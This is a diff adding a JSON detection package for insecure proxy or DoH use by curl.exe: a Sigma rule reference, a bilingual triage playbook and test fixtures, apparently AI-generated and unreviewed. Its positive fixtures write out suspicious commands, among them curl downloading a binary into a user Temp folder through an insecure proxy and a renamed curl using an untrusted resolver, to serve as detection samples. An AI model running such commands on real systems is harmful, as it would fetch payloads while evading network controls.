@@ -1,0 +1,127 @@
+{
+  "rule": {
+    "id": "2c1486f5-02e8-4f86-9099-b97f2da4ed77",
+    "title": "Insecure Proxy/DOH Transfer Via Curl.EXE",
+    "level": "medium",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_curl_insecure_proxy_or_doh.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_curl_insecure_proxy_or_doh.yml",
+    "license": "DRL-1.1",
+    "techniques": []
+  },
+  "playbook": {
+    "es": {
+      "summary": "curl.exe se ejecutó con --proxy-insecure o --doh-insecure, lo que desactiva la validación del certificado TLS del proxy o del resolver DNS-over-HTTPS. Alguien podría estar enviando tráfico por infraestructura sin un certificado válido.",
+      "what_it_detects": "Eventos de creación de procesos donde Image termina en \\curl.exe u OriginalFileName es curl.exe, y CommandLine contiene --proxy-insecure o --doh-insecure. La coincidencia por OriginalFileName también detecta copias renombradas de curl.",
+      "why_it_matters": "Los atacantes usan curl para descargar payloads o sacar datos mediante proxies o resolvers DoH propios, que suelen tener certificados autofirmados. Desactivar la validación evade los controles habituales de DNS y proxy. La regla está etiquetada con la táctica Execution de ATT&CK y la actividad suele servir para descargar herramientas o para comando y control.",
+      "triage_steps": [
+        "Revise el CommandLine completo. Anote el proxy (-x/--proxy) o el host de --doh-url, la URL de destino, el archivo de salida (-o/-O) y las opciones de envío (-d, -F, -T).",
+        "Revise ParentImage y la línea de comandos del proceso padre. Un curl lanzado por un intérprete de scripts, Office, cmd o PowerShell desde el perfil del usuario es más sospechoso que una herramienta de build conocida.",
+        "Compare Image con OriginalFileName. Si curl se ejecuta desde una carpeta temporal o de usuario, o con otro nombre, trátelo como sospechoso.",
+        "Consulte los hosts e IP del proxy, del DoH y del destino en threat intel y en los logs de proxy y firewall. Verifique si son sistemas internos aprobados.",
+        "Revise el mismo host en +/- 15 minutos: archivos escritos por curl, procesos hijos, conexiones nuevas y cambios de persistencia.",
+        "Pivotee por el usuario y por el host de destino para encontrar alertas previas o el mismo comando en otros endpoints."
+      ],
+      "false_positives": [
+        "Desarrolladores o administradores que acceden a sistemas internos o de laboratorio mal mantenidos, con certificados autofirmados en el proxy o en el resolver DoH.",
+        "Scripts de prueba o jobs de CI que apuntan a proxies de intercepción locales (por ejemplo, proxies de depuración) durante el desarrollo."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o con el responsable del sistema si el comando y el endpoint de proxy o DoH están autorizados.",
+        "Si la actividad no tiene explicación, aísle el endpoint y bloquee en el perímetro los hosts del proxy, del DoH y del destino.",
+        "Recolecte los archivos descargados, calcule su hash y analícelos. Elimínelos solo cuando el análisis confirme que son maliciosos.",
+        "Restablezca las credenciales del usuario si hubo exfiltración o compromiso de la cuenta. Luego busque la misma línea de comandos en toda la flota.",
+        "Si el uso es legítimo, pida al responsable que corrija los certificados y cree una exclusión acotada por host y proceso padre."
+      ],
+      "severity_rationale": "El nivel medio es adecuado porque desactivar la validación TLS de un proxy o de DoH es inusual y puede ocultar tráfico malicioso, aunque existen usos internos y de desarrollo legítimos."
+    },
+    "en": {
+      "summary": "curl.exe ran with --proxy-insecure or --doh-insecure, which turns off TLS certificate checks for the proxy or the DNS-over-HTTPS resolver. Someone may be routing traffic through infrastructure that does not have a valid certificate.",
+      "what_it_detects": "Process creation events where Image ends with \\curl.exe or OriginalFileName is curl.exe, and CommandLine contains --proxy-insecure or --doh-insecure. The OriginalFileName match also catches renamed copies of curl.",
+      "why_it_matters": "Attackers use curl to download payloads or send data out through their own proxies or DoH resolvers, which often have self-signed certificates. Turning off certificate checks hides that traffic from normal DNS and proxy controls. The rule's ATT&CK tag is Execution, and the activity often supports tool download or command and control.",
+      "triage_steps": [
+        "Read the full CommandLine: note the proxy (-x/--proxy) or --doh-url host, the target URL, output file (-o/-O) and any upload flags (-d, -F, -T).",
+        "Check ParentImage and the parent command line. curl started by a script host, Office, cmd or PowerShell from a user profile deserves more suspicion than a known build tool.",
+        "Compare Image with OriginalFileName. If curl runs from a temp or user folder or under another name, treat it as suspicious.",
+        "Look up the proxy, DoH and destination hosts and IPs in threat intel and proxy/firewall logs. Check whether they are approved internal systems.",
+        "Look at the same host within +/- 15 minutes for files curl wrote, child processes, new network connections and persistence changes.",
+        "Pivot on the user and on the destination host to find earlier alerts or the same command on other endpoints."
+      ],
+      "false_positives": [
+        "Developers or admins reaching poorly maintained internal or lab systems that use self-signed certificates on the proxy or DoH resolver.",
+        "Test scripts or CI jobs that point at local intercepting proxies (for example debugging proxies) during development."
+      ],
+      "response_steps": [
+        "Confirm with the user or system owner whether the command and the proxy/DoH endpoint are approved.",
+        "If the activity is not explained, isolate the endpoint and block the proxy, DoH and destination hosts at the perimeter.",
+        "Collect and hash any downloaded files, scan them, and remove them once analysis confirms they are malicious.",
+        "Reset the user's credentials if data was exfiltrated or the account looks compromised. Then hunt for the same command line across the fleet.",
+        "For legitimate cases, ask the owner to fix the certificates and add a narrow exclusion by host and parent process."
+      ],
+      "severity_rationale": "Medium fits because turning off TLS checks for a proxy or DoH is unusual and can hide malicious traffic, but some legitimate internal and development use exists."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "curl.exe launched by PowerShell downloads a file through a proxy with --proxy-insecure",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\curl.exe",
+          "OriginalFileName": "curl.exe",
+          "CommandLine": "curl.exe --proxy https://203.0.113.10:8443 --proxy-insecure -o C:\\Users\\jperez\\AppData\\Local\\Temp\\upd.bin https://files.example.com/upd.bin",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CurrentDirectory": "C:\\Users\\jperez\\"
+        }
+      },
+      {
+        "description": "Renamed curl binary (OriginalFileName curl.exe) using an untrusted DoH resolver with --doh-insecure",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Users\\Public\\svchelper.exe",
+          "OriginalFileName": "curl.exe",
+          "CommandLine": "svchelper.exe --doh-url https://doh.example.org/dns-query --doh-insecure -s https://cdn.example.org/a.txt",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "curl.exe with --insecure (-k) against a host, without a proxy or DoH insecure flag",
+        "event": {
+          "EventID": 1,
+          "Computer": "BUILD-03.andes.example.com",
+          "User": "ANDES\\svc_build",
+          "Image": "C:\\Windows\\System32\\curl.exe",
+          "OriginalFileName": "curl.exe",
+          "CommandLine": "curl.exe -k -o C:\\build\\pkg.zip https://repo.example.com/pkg.zip",
+          "ParentImage": "C:\\Program Files\\Git\\bin\\bash.exe"
+        }
+      },
+      {
+        "description": "curl.exe going through a corporate proxy with normal certificate checks",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\curl.exe",
+          "OriginalFileName": "curl.exe",
+          "CommandLine": "curl.exe --proxy https://proxy.example.com:3128 https://www.example.com/status",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
